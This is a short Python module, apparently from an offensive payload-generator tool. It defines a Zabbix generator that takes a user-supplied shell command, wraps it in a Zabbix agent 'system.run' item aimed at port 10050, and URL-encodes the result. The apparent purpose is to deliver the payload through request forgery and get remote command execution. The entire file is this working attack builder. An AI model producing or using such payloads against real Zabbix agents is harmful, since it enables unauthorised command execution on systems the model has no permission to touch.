from .base import *

class Zabbix(GENERATOR):
    requirement = ["command"]
    def __init__(self, parser,options={}):
        if options["port"] == 0:
            options["port"] = 10050
        super().__init__(parser,options)
        self.set_requirement(self.requirement)
        arg = self.get_requirement()
        if arg.command == "":
            self.wizard("Give the command to execute:", "command")
        else:
            self.command = arg.command
    
    def generate(self):
        command = self.command
        payload = "system.run[("  + command + ");sleep 2s]"
        self.set_mode(PAYLOAD_TYPE.QUOTE_PLUS).\
            set_payload(payload).\
            replace("+", "%20").\
            replace("%2F", "/").\
            replace("%25", "%").\
            replace("%3A", ":")
        return super().generate()